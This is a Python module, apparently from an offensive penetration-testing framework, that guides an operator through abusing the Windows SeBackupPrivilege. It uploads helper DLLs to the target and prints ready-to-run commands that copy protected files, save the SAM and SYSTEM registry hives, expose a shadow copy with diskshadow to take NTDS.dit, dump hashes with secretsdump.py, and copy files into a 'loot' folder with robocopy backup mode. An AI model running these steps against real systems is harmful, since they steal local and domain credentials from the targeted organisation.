from pathlib import Path
from modules.upload.windows import stage_windows_files

# =========================================================
# COLORS
# =========================================================

G = '\033[92m'
C = '\033[96m'
B = '\033[94m'
Y = '\033[93m'
R = '\033[91m'
W = '\033[0m'
W_BOLD = '\033[1m'

# =========================================================
# PATHS
# =========================================================

BASE_DIR = Path(__file__).resolve().parents[3]

UTILS_DLL = (
    BASE_DIR /
    "exploits" /
    "windows" /
    "backup" /
    "SeBackupPrivilegeUtils.dll"
)

CMDLETS_DLL = (
    BASE_DIR /
    "exploits" /
    "windows" /
    "backup" /
    "SeBackupPrivilegeCmdLets.dll"
)

# =========================================================
# HELPERS
# =========================================================

def ask_enabled():

    try:

        result = input(
            f"\n{B}enabled? [y/N]{W}> "
        ).strip().lower()

    except (KeyboardInterrupt, EOFError):

        print()

        return False

    return result == "y"





def setup_privilege(data):

    print(
        f"\n{B}[*]{W} "
        f"TRANSFERRING SeBackupPrivilege HELPERS"
    )

    try:

       stage_windows_files([
            str(UTILS_DLL),
            str(CMDLETS_DLL),
        ])

    except Exception as e:

        print(
            f"\n{R}[!] Transfer failed:{W} {e}"
        )

        return

    print(
        f"\n{G}[+] Transfer complete.{W}"
    )

    print(
        f"\n{Y}"
        f"┌── ENABLE PRIVILEGE "
        f"────────────────────────────┐{W}"
    )

    print(
        f"{Y}│{W} "
        f"Import-Module .\\SeBackupPrivilegeUtils.dll"
    )

    print(
        f"{Y}│{W} "
        f"Import-Module .\\SeBackupPrivilegeCmdLets.dll"
    )

    print(
        f"{Y}│{W} "
        f"Set-SeBackupPrivilege"
    )

    print(
        f"{Y}│{W} "
        f"Get-SeBackupPrivilege"
    )

    print(
        f"{Y}"
        f"└──────────────────────────────────────────────────┘{W}"
    )


# =========================================================
# MENUS
# =========================================================

def render_menu():

    print(
        f"\n{B}[*]{W} "
        f"ABUSE PATHS\n"
    )

    print(f"  {B}├──{W} [1] Copy protected file")
    print(f"  {B}├──{W} [2] Dump SAM/SYSTEM")
    print(f"  {B}├──{W} [3] Dump NTDS.dit")
    print(f"  {B}└──{W} [4] Robocopy backup mode")


# =========================================================
# ACTIONS
# =========================================================

def copy_file():

    target = input(
        f"\n{B}target file{W}> "
    ).strip()

    dst = input(
        f"{B}output file{W}> "
    ).strip()

    if not target or not dst:
        return

    print(
        f"\n{G}"
        f"┌── COPY FILE "
        f"──────────────────────────────────────┐{W}"
    )

    print(
        f'{G}│{W} '
        f'Copy-FileSeBackupPrivilege "{target}" "{dst}"'
    )

    print(
        f"{G}"
        f"└──────────────────────────────────────────────────┘{W}"
    )


def dump_sam():

    print(
        f"\n{G}"
        f"┌── DUMP SAM/SYSTEM "
        f"────────────────────────────────┐{W}"
    )

    print(
        f"{G}│{W} "
        f"reg save HKLM\\SYSTEM SYSTEM.SAV"
    )

    print(
        f"{G}│{W} "
        f"reg save HKLM\\SAM SAM.SAV"
    )

    print(
        f"{G}│{W} "
        f"secretsdump.py -sam SAM.SAV -system SYSTEM.SAV LOCAL"
    )

    print(
        f"{G}"
        f"└──────────────────────────────────────────────────┘{W}"
    )


def dump_ntds():

    print(
        f"\n{G}"
        f"┌── DISKSHADOW "
        f"─────────────────────────────────────┐{W}"
    )

    commands = [

        "diskshadow.exe",
        "set verbose on",
        "set metadata C:\\Windows\\Temp\\meta.cab",
        "set context clientaccessible",
        "set context persistent",
        "begin backup",
        "add volume C: alias cdrive",
        "create",
        "expose %cdrive% E:",
        "end backup",
        "exit",
    ]

    for cmd in commands:

        print(f"{G}│{W} {cmd}")

    print(
        f"{G}"
        f"└──────────────────────────────────────────────────┘{W}"
    )

    print(
        f"\n{G}"
        f"┌── COPY NTDS "
        f"──────────────────────────────────────┐{W}"
    )

    print(
        f"{G}│{W} "
        f"Copy-FileSeBackupPrivilege E:\\Windows\\NTDS\\ntds.dit .\\ntds.dit"
    )

    print(
        f"{G}│{W} "
        f"reg save HKLM\\SYSTEM SYSTEM.SAV"
    )

    print(
        f"{G}│{W} "
        f"secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL"
    )

    print(
        f"{G}"
        f"└──────────────────────────────────────────────────┘{W}"
    )


def robocopy_mode():

    src = input(
        f"\n{B}source dir{W}> "
    ).strip()

    file = input(
        f"{B}file name{W}> "
    ).strip()

    if not src or not file:
        return

    print(
        f"\n{G}"
        f"┌── ROBOCOPY "
        f"───────────────────────────────────────┐{W}"
    )

    print(
        f"{G}│{W} "
        f"robocopy /B {src} .\\loot {file}"
    )

    print(
        f"{G}"
        f"└──────────────────────────────────────────────────┘{W}"
    )


# =========================================================
# MAIN
# =========================================================

def run(data=None, cred=None, args=None):

    print(
        f"\n{W_BOLD}"
        f"[*] SE BACKUP PRIVILEGE ABUSE{W}"
    )

    # =====================================================
    # ENABLED?
    # =====================================================

    enabled = ask_enabled()

    if not enabled:

        print(
            f"\n{Y}[!] "
            f"Privilege currently disabled.{W}"
        )

        try:

            choice = input(
                f"\n{B}transfer helper DLLs? [Y/n]{W}> "
            ).strip().lower()

        except (KeyboardInterrupt, EOFError):

            print()
            return data

        if not choice or choice == "y":

            setup_privilege(data)

    else:

        print(
            f"\n{G}[+] "
            f"Privilege enabled.{W}"
        )

    # =====================================================
    # MENU
    # =====================================================

    render_menu()

    try:

        choice = input(
            f"\n{B}select{W}> "
        ).strip()

    except (KeyboardInterrupt, EOFError):

        print()
        return data

    if choice == "1":

        copy_file()

    elif choice == "2":

        dump_sam()

    elif choice == "3":

        dump_ntds()

    elif choice == "4":

        robocopy_mode()

    return data
